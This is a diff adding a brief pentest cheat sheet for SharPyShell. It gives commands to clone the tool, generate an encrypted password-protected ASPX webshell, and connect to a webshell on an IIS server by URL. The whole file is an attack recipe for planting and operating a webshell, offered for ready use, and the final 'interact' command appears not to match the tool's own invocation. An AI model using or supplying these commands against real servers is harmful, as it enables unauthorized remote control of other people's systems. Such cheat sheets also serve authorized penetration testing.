@@ -1,0 +1,15 @@
+% web, iis, sharpyshell, webshell, aspx
+@ web-variables
+; From https://github.com/antonioCoco/SharPyShell
+; Tool: https://github.com/bitquark/shortscan
+
+# Setup SharPyShell environment
+git clone https://github.com/antonioCoco/SharPyShell && \
+cd SharPyShell && \
+python3 -m venv .venv && . .venv/bin/activate
+
+# Create a password-based encrypted ASPX webshell with SharPyShell:
+python3 SharPyShell.py generate -p <password>
+
+# Connect to a SharPyShell ASPX webshell
+python3 interact -u <shell-url> -p <password>
